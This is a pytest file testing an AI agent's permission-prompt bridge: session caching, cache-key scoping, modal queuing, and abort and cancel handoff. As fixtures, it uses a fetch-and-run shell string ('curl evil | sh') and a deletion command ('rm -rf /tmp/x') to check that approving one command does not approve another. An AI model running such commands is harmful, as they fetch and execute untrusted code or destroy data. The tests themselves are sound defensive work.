from __future__ import annotations

import asyncio
import pytest

from src.permission.permission import PermissionRequest, Decision
from src.ui.core.app import AbortEvent
from src.ui.bridges.perm_bridge import (
    BridgedPrompter,
    BridgedPermissionRequest as BridgePermissionRequest,
)


def make_bridge(decision: Decision):
    shown = 0
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal shown, pending

        if req is not None:
            shown += 1
            pending = req

    bridge = BridgedPrompter(publish)

    async def ask(req: PermissionRequest):
        nonlocal pending

        task = asyncio.create_task(
            bridge.ask(req)
        )

        await asyncio.sleep(0)

        if pending is not None:
            p = pending
            pending = None
            p.resolve(decision)

        return await task

    return ask, lambda: shown

@pytest.mark.asyncio
async def test_cache_allow_session_per_tool():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    req = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
    )

    await ask(req)
    await ask(req)

    assert modals() == 1


@pytest.mark.asyncio
async def test_bridge_preserves_yolo_eligibility_metadata():
    shown: list[BridgePermissionRequest] = []

    def publish(request: BridgePermissionRequest | None) -> None:
        if request is not None:
            shown.append(request)

    bridge = BridgedPrompter(publish)
    task = asyncio.create_task(bridge.ask(PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
        yolo_auto_approve=True,
    )))
    await asyncio.sleep(0)

    assert len(shown) == 1
    assert shown[0].yolo_auto_approve is True
    shown[0].resolve(Decision.ALLOW_ONCE)
    assert await task == Decision.ALLOW_ONCE


@pytest.mark.asyncio
async def test_allow_once_does_not_populate_the_session_cache():
    ask, modals = make_bridge(Decision.ALLOW_ONCE)
    req = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
        cache_key="https://example.test",
    )

    await ask(req)
    await ask(req)

    assert modals() == 2


@pytest.mark.asyncio
async def test_no_session_cache_always_reprompt():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    req = PermissionRequest(
        tool="file_read",
        summary="s",
        detail="d",
        no_session_cache=True,
    )

    await ask(req)
    await ask(req)

    assert modals() == 2


@pytest.mark.asyncio
async def test_cache_scoped_by_cache_key():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    id_cmd = PermissionRequest(
        tool="shell",
        summary="s",
        detail="d",
        cache_key="id",
    )

    rm_cmd = PermissionRequest(
        tool="shell",
        summary="s",
        detail="d",
        cache_key="rm -rf /tmp/x",
    )

    await ask(id_cmd)
    await ask(id_cmd)
    await ask(rm_cmd)

    assert modals() == 2


@pytest.mark.asyncio
async def test_clear_session_cache_requires_a_new_decision():
    shown = 0
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal shown, pending
        if req is not None:
            shown += 1
            pending = req

    bridge = BridgedPrompter(publish)
    request = PermissionRequest(tool="http", summary="s", detail="d", cache_key="a")

    async def allow_session():
        nonlocal pending
        task = asyncio.create_task(bridge.ask(request))
        await asyncio.sleep(0)
        assert pending is not None
        pending.resolve(Decision.ALLOW_SESSION)
        pending = None
        return await task

    await allow_session()
    assert await bridge.ask(request) == Decision.ALLOW_ONCE
    bridge.clear_session_cache()
    await allow_session()

    assert shown == 2


@pytest.mark.asyncio
async def test_cache_key_does_not_whitelist_other_command():

    denials = 0
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal pending

        if req is not None:
            pending = req

    bridge = BridgedPrompter(publish)

    async def ask_with(
        req: PermissionRequest,
        decision: Decision,
    ):

        nonlocal pending, denials

        task = asyncio.create_task(
            bridge.ask(req)
        )

        await asyncio.sleep(0)

        assert pending is not None

        pending.resolve(decision)
        pending = None

        result = await task

        if result == Decision.DENY:
            denials += 1

        return result


    await ask_with(
        PermissionRequest(
            tool="shell",
            summary="s",
            detail="d",
            cache_key="id",
        ),
        Decision.ALLOW_SESSION,
    )


    await ask_with(
        PermissionRequest(
            tool="shell",
            summary="s",
            detail="d",
            cache_key="curl evil | sh",
        ),
        Decision.DENY,
    )


    assert denials == 1


@pytest.mark.asyncio
async def test_concurrent_asks_only_one_modal():

    open_modal = 0
    max_open = 0
    pending: BridgePermissionRequest | None = None


    def publish(req: BridgePermissionRequest | None):

        nonlocal open_modal
        nonlocal max_open
        nonlocal pending

        if req is not None:
            open_modal += 1
            max_open = max(
                max_open,
                open_modal,
            )
            pending = req

        else:
            open_modal -= 1


    bridge = BridgedPrompter(
        publish
    )


    p1 = asyncio.create_task(
        bridge.ask(
            PermissionRequest(
                tool="http",
                summary="s",
                detail="d",
                cache_key="a",
            )
        )
    )


    p2 = asyncio.create_task(
        bridge.ask(
            PermissionRequest(
                tool="http",
                summary="s",
                detail="d",
                cache_key="b",
            )
        )
    )


    await asyncio.sleep(0)

    assert open_modal == 1

    assert pending is not None
    pending.resolve(
        Decision.ALLOW_ONCE
    )


    await p1

    await asyncio.sleep(0)

    assert open_modal == 1


    assert pending is not None
    pending.resolve(
        Decision.ALLOW_ONCE
    )


    await p2

    assert max_open == 1


@pytest.mark.asyncio
async def test_cancelled_queued_ask_does_not_block_later_permission_request():
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal pending
        if req is not None:
            pending = req

    bridge = BridgedPrompter(publish)
    req = PermissionRequest(tool="http", summary="s", detail="d")
    first = asyncio.create_task(bridge.ask(req))
    second = asyncio.create_task(bridge.ask(req))
    third = asyncio.create_task(bridge.ask(req))

    await asyncio.sleep(0)
    second.cancel()
    with pytest.raises(asyncio.CancelledError):
        await second

    assert pending is not None
    pending.resolve(Decision.ALLOW_ONCE)
    await first
    await asyncio.sleep(0)

    assert pending is not None
    pending.resolve(Decision.ALLOW_ONCE)
    assert await third == Decision.ALLOW_ONCE


@pytest.mark.asyncio
async def test_abort_signal_rejects_open_permission_prompt():
    shown = []
    bridge = BridgedPrompter(shown.append)
    signal = asyncio.Event()
    task = asyncio.create_task(
        bridge.ask(
            PermissionRequest(tool="http", summary="s", detail="d"),
            signal,
        )
    )

    await asyncio.sleep(0)
    signal.set()

    with pytest.raises(Exception, match="aborted"):
        await task
    assert shown[-1] is None


@pytest.mark.asyncio
async def test_preaborted_signal_rejects_cached_session_permission():
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal pending
        if req is not None:
            pending = req

    bridge = BridgedPrompter(publish)
    request = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
        cache_key="https://example.test",
    )

    initial = asyncio.create_task(bridge.ask(request))
    await asyncio.sleep(0)
    assert pending is not None
    pending.resolve(Decision.ALLOW_SESSION)
    assert await initial == Decision.ALLOW_SESSION

    signal = asyncio.Event()
    signal.set()

    with pytest.raises(Exception, match="aborted"):
        await bridge.ask(request, signal)



@pytest.mark.asyncio
async def test_same_origin_fanout_uses_session_cache():

    open_modal = 0
    max_open = 0
    pending: BridgePermissionRequest | None = None


    def publish(req: BridgePermissionRequest | None):

        nonlocal open_modal
        nonlocal max_open
        nonlocal pending

        if req is not None:
            open_modal += 1
            max_open = max(
                max_open,
                open_modal,
            )
            pending = req

        else:
            open_modal -= 1


    bridge = BridgedPrompter(
        publish
    )


    req = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
        cache_key="https://t",
    )


    p1 = asyncio.create_task(
        bridge.ask(req)
    )

    p2 = asyncio.create_task(
        bridge.ask(req)
    )

    p3 = asyncio.create_task(
        bridge.ask(req)
    )


    await asyncio.sleep(0)

    assert open_modal == 1


    assert pending is not None
    pending.resolve(
        Decision.ALLOW_SESSION
    )


    d1 = await p1

    await asyncio.sleep(0)


    d2, d3 = await asyncio.gather(
        p2,
        p3,
    )


    assert d1 == Decision.ALLOW_SESSION
    assert d2 == Decision.ALLOW_ONCE
    assert d3 == Decision.ALLOW_ONCE
    assert max_open == 1


class ObservedAbortEvent(AbortEvent):
    """Expose watcher startup without changing the real TUI abort behavior."""

    def __init__(self):
        super().__init__()
        self.watchers: asyncio.Queue[asyncio.Task] = asyncio.Queue()

    async def wait(self):
        task = asyncio.current_task()
        assert task is not None
        self.watchers.put_nowait(task)
        return await super().wait()


class PermissionHarness:
    def __init__(self):
        self.modals: asyncio.Queue[BridgePermissionRequest] = asyncio.Queue()
        self.waits: dict[asyncio.Task, asyncio.Queue[asyncio.Future]] = {}
        self.tasks: list[asyncio.Task] = []
        self.watchers: list[asyncio.Task] = []
        self.futures: list[asyncio.Future] = []
        self.current: BridgePermissionRequest | None = None
        self.shown: list[str] = []

        harness = self

        class ObservedBridge(BridgedPrompter):
            async def _await_with_signal(self, future, signal):
                harness.futures.append(future)
                task = asyncio.current_task()
                assert task is not None
                harness.waits[task].put_nowait(future)
                return await super()._await_with_signal(future, signal)

        self.bridge = ObservedBridge(self.publish)

    def publish(self, request):
        if request is not None:
            assert self.current is None, "two permission modals are open"
            self.shown.append(request.summary)
            self.modals.put_nowait(request)
        self.current = request

    async def start(self, label, signal=None, *, invocation=None, cache_key=None):
        request = PermissionRequest(
            tool="fixture", summary=label, detail=label, cache_key=cache_key,
        )
        task = asyncio.create_task(
            invocation if invocation is not None else self.bridge.ask(request, signal)
        )
        self.tasks.append(task)
        self.waits[task] = asyncio.Queue()
        future = await asyncio.wait_for(self.waits[task].get(), 1)
        if signal is not None:
            self.watchers.append(await asyncio.wait_for(signal.watchers.get(), 1))
        return task, future

    async def modal(self):
        return await asyncio.wait_for(self.modals.get(), 1)

    def assert_idle(self):
        assert not self.bridge._busy
        assert self.bridge._owner is None
        assert not self.bridge._waiters
        assert self.current is None
        assert all(task.done() for task in self.tasks + self.watchers)
        assert all(future.done() for future in self.futures)

    async def complete_fresh(self):
        task, _ = await self.start("fresh", ObservedAbortEvent())
        modal = await self.modal()
        assert modal.summary == "fresh"
        modal.resolve(Decision.ALLOW_ONCE)
        assert await asyncio.wait_for(task, 1) == Decision.ALLOW_ONCE
        self.assert_idle()


@pytest.fixture
async def permissions():
    harness = PermissionHarness()
    try:
        yield harness
    finally:
        for task in harness.tasks + harness.watchers:
            if not task.done():
                task.cancel()
        await asyncio.gather(*harness.tasks, *harness.watchers, return_exceptions=True)


@pytest.mark.asyncio
@pytest.mark.parametrize("abort_order", ["shared", "queued-first", "active-first"])
async def test_shared_abort_handoff_allows_fresh_request(permissions, abort_order):
    active_signal = ObservedAbortEvent()
    queued_signal = active_signal if abort_order == "shared" else ObservedAbortEvent()
    active, _ = await permissions.start("active", active_signal)
    await permissions.modal()
    queued, waiter = await permissions.start("queued", queued_signal)

    if abort_order == "queued-first":
        queued_signal.abort()
        with pytest.raises(Exception, match="aborted"):
            await queued
        active_signal.abort()
    else:
        active_signal.abort()
        if abort_order == "active-first":
            # Runs after the active watcher, before the queued request resumes.
            asyncio.get_running_loop().call_soon(queued_signal.abort)

    results = await asyncio.gather(active, queued, return_exceptions=True)
    assert [str(result) for result in results] == ["aborted", "aborted"]
    assert waiter.done()
    permissions.assert_idle()
    await permissions.complete_fresh()


@pytest.mark.asyncio
@pytest.mark.parametrize("has_successor", [False, True])
async def test_queued_cancel_immediately_after_handoff(permissions, has_successor):
    active, _ = await permissions.start("active")
    modal = await permissions.modal()
    queued, waiter = await permissions.start("queued", ObservedAbortEvent())
    successor = None
    if has_successor:
        successor, _ = await permissions.start("successor")
    handed_off = asyncio.Event()

    def cancel_on_handoff(completed):
        assert completed.done() and not completed.cancelled()
        assert completed not in permissions.bridge._waiters
        assert permissions.current is None
        queued.cancel()
        handed_off.set()

    waiter.add_done_callback(cancel_on_handoff)
    modal.resolve(Decision.ALLOW_ONCE)
    assert await active == Decision.ALLOW_ONCE
    await asyncio.wait_for(handed_off.wait(), 1)
    with pytest.raises(asyncio.CancelledError):
        await queued
    if successor is not None:
        next_modal = await permissions.modal()
        assert next_modal.summary == "successor"
        next_modal.resolve(Decision.ALLOW_ONCE)
        assert await successor == Decision.ALLOW_ONCE
    assert "queued" not in permissions.shown
    permissions.assert_idle()
    await permissions.complete_fresh()


@pytest.mark.asyncio
async def test_queued_cancel_after_handoff_without_signal(permissions, monkeypatch):
    active, _ = await permissions.start("active")
    await permissions.modal()
    queued, waiter = await permissions.start("queued")
    successor, _ = await permissions.start("successor")
    handed_off = asyncio.Event()
    publish = permissions.bridge._publish

    def cancel_on_handoff():
        assert waiter.done() and not waiter.cancelled()
        assert waiter not in permissions.bridge._waiters
        assert permissions.current is None
        queued.cancel()
        handed_off.set()

    def publish_cleanup(request):
        publish(request)
        if request is None and not handed_off.is_set():
            # Active cancellation clears its modal synchronously, then hands
            # off before this callback and the queued task get to resume.
            asyncio.get_running_loop().call_soon(cancel_on_handoff)

    monkeypatch.setattr(permissions.bridge, "_publish", publish_cleanup)
    active.cancel()
    with pytest.raises(asyncio.CancelledError):
        await active
    await asyncio.wait_for(handed_off.wait(), 1)
    with pytest.raises(asyncio.CancelledError):
        await queued
    modal = await permissions.modal()
    assert modal.summary == "successor"
    modal.resolve(Decision.ALLOW_ONCE)
    await successor
    assert "queued" not in permissions.shown
    permissions.assert_idle()


@pytest.mark.asyncio
@pytest.mark.parametrize("cache", [False, True])
async def test_queued_abort_after_handoff_releases_owner_before_modal_or_cache(permissions, cache):
    active, _ = await permissions.start("active", cache_key="same-origin")
    modal = await permissions.modal()
    signal = ObservedAbortEvent()
    queued, waiter = await permissions.start("queued", signal, cache_key="same-origin")
    successor, _ = await permissions.start("successor", cache_key="other-origin")
    handed_off = asyncio.Event()

    def abort_on_handoff(completed):
        assert completed.done() and not completed.cancelled()
        assert completed not in permissions.bridge._waiters
        assert permissions.current is None
        signal.abort()
        handed_off.set()

    waiter.add_done_callback(abort_on_handoff)
    modal.resolve(Decision.ALLOW_SESSION if cache else Decision.ALLOW_ONCE)
    await active
    await asyncio.wait_for(handed_off.wait(), 1)
    with pytest.raises(Exception, match="aborted"):
        await queued
    modal = await permissions.modal()
    assert modal.summary == "successor"
    modal.resolve(Decision.ALLOW_ONCE)
    await successor
    assert permissions.shown == ["active", "successor"]
    permissions.assert_idle()


@pytest.mark.asyncio
@pytest.mark.parametrize("stop", ["abort", "cancel"])
async def test_queued_stop_before_handoff_preserves_live_owner(permissions, stop):
    active, _ = await permissions.start("active")
    modal = await permissions.modal()
    signal = ObservedAbortEvent()
    queued, waiter = await permissions.start("queued", signal)
    successor, _ = await permissions.start("successor")
    if stop == "abort":
        signal.abort()
        with pytest.raises(Exception, match="aborted"):
            await queued
    else:
        queued.cancel()
        with pytest.raises(asyncio.CancelledError):
            await queued
    assert waiter.done()
    assert permissions.bridge._busy and permissions.current is modal
    assert not active.done() and not successor.done()
    modal.resolve(Decision.ALLOW_ONCE)
    await active
    next_modal = await permissions.modal()
    assert next_modal.summary == "successor"
    next_modal.resolve(Decision.ALLOW_ONCE)
    await successor
    permissions.assert_idle()


@pytest.mark.asyncio
@pytest.mark.parametrize("signal", [False, True])
async def test_active_cancel_transfers_ownership_and_cleans_modal(permissions, signal):
    active, _ = await permissions.start("active", ObservedAbortEvent() if signal else None)
    await permissions.modal()
    successor, _ = await permissions.start("successor")
    active.cancel()
    with pytest.raises(asyncio.CancelledError):
        await active
    modal = await permissions.modal()
    assert modal.summary == "successor"
    modal.resolve(Decision.ALLOW_ONCE)
    await successor
    permissions.assert_idle()


@pytest.mark.asyncio
@pytest.mark.parametrize("outcome", ["deny", "reject", "publish-error"])
async def test_active_failure_preserves_queue(permissions, outcome, monkeypatch):
    active, _ = await permissions.start("active")
    modal = await permissions.modal()
    failing, _ = await permissions.start("failing")
    successor, _ = await permissions.start("successor")
    if outcome == "publish-error":
        publish = permissions.bridge._publish

        def fail_publish(request):
            if request is not None and request.summary == "failing":
                raise RuntimeError("fixture modal failure")
            publish(request)

        monkeypatch.setattr(permissions.bridge, "_publish", fail_publish)
    modal.resolve(Decision.ALLOW_ONCE)
    await active
    if outcome != "publish-error":
        modal = await permissions.modal()
        assert modal.summary == "failing"
        if outcome == "deny":
            modal.resolve(Decision.DENY)
        else:
            modal.reject(RuntimeError("fixture modal failure"))
    if outcome == "deny":
        assert await failing == Decision.DENY
    else:
        with pytest.raises(RuntimeError, match="fixture modal failure"):
            await failing
    modal = await permissions.modal()
    assert modal.summary == "successor"
    modal.resolve(Decision.ALLOW_ONCE)
    await successor
    permissions.assert_idle()


@pytest.mark.asyncio
async def test_fifo_drains_done_waiters_without_duplicate_modals(permissions):
    active, _ = await permissions.start("active")
    modal = await permissions.modal()
    first, _ = await permissions.start("first")
    second, _ = await permissions.start("second")
    # Cancelled/completed entries can remain from an interrupted queue wait.
    loop = asyncio.get_running_loop()
    cancelled: asyncio.Future[None] = loop.create_future()
    cancelled.cancel()
    completed: asyncio.Future[None] = loop.create_future()
    completed.set_result(None)
    permissions.bridge._waiters.insert(0, cancelled)
    permissions.bridge._waiters.insert(2, completed)
    modal.resolve(Decision.ALLOW_ONCE)
    await active
    for label, task in [("first", first), ("second", second)]:
        modal = await permissions.modal()
        assert modal.summary == label
        modal.resolve(Decision.ALLOW_ONCE)
        assert await task == Decision.ALLOW_ONCE
    assert permissions.shown == ["active", "first", "second"]
    permissions.assert_idle()


@pytest.mark.asyncio
async def test_cancelled_cache_handoff_keeps_fanout_scoped(permissions):
    first, _ = await permissions.start("first", cache_key="origin-a")
    modal = await permissions.modal()
    cancelled, waiter = await permissions.start("cancelled", ObservedAbortEvent(), cache_key="origin-a")
    cached, _ = await permissions.start("cached", cache_key="origin-a")
    other, _ = await permissions.start("other", cache_key="origin-b")
    waiter.add_done_callback(lambda _: cancelled.cancel())
    modal.resolve(Decision.ALLOW_SESSION)
    assert await first == Decision.ALLOW_SESSION
    with pytest.raises(asyncio.CancelledError):
        await cancelled
    assert await asyncio.wait_for(cached, 1) == Decision.ALLOW_ONCE
    modal = await permissions.modal()
    assert modal.summary == "other"
    modal.resolve(Decision.ALLOW_ONCE)
    await other
    assert permissions.shown == ["first", "other"]
    permissions.assert_idle()


@pytest.mark.asyncio
async def test_registry_shared_abort_then_fresh_turn_reads_local_file(permissions, tmp_path):
    from src.engagement.state import EngagementState
    from src.permission.execution import default_execution_policy
    from src.permission.invocations import review_turn
    from src.permission.permission import YoloPrompter
    from src.tools.execution.file import FileReadTool
    from src.tools.common.registry import Registry

    path = tmp_path / ".env"
    path.write_text("LOCAL_FIXTURE_ONLY=permission-bridge", encoding="utf-8")
    registry = Registry()
    registry.register(FileReadTool())
    policy = default_execution_policy(EngagementState(), tmp_path)
    prompter = YoloPrompter(permissions.bridge, initial=False)
    prompter.bind_execution_policy(policy)
    args = {"path": str(path)}
    signal = ObservedAbortEvent()

    with review_turn():
        active, _ = await permissions.start(
            "active", signal,
            invocation=registry.execute("file_read", args, signal, prompter),
        )
        await permissions.modal()
        queued, _ = await permissions.start(
            "queued", signal,
            invocation=registry.execute("file_read", args, signal, prompter),
        )
        signal.abort()
        results = await asyncio.gather(active, queued, return_exceptions=True)
        assert [str(result) for result in results] == ["aborted", "aborted"]
    permissions.assert_idle()
    assert policy.active == 0

    with review_turn():
        signal = ObservedAbortEvent()
        fresh, _ = await permissions.start(
            "fresh", signal,
            invocation=registry.execute("file_read", args, signal, prompter),
        )
        modal = await permissions.modal()
        assert modal.tool == "file" and modal.no_session_cache
        modal.resolve(Decision.ALLOW_ONCE)
        assert await asyncio.wait_for(fresh, 1) == "LOCAL_FIXTURE_ONLY=permission-bridge"
    permissions.assert_idle()
    assert policy.active == 0
    assert not policy._denied
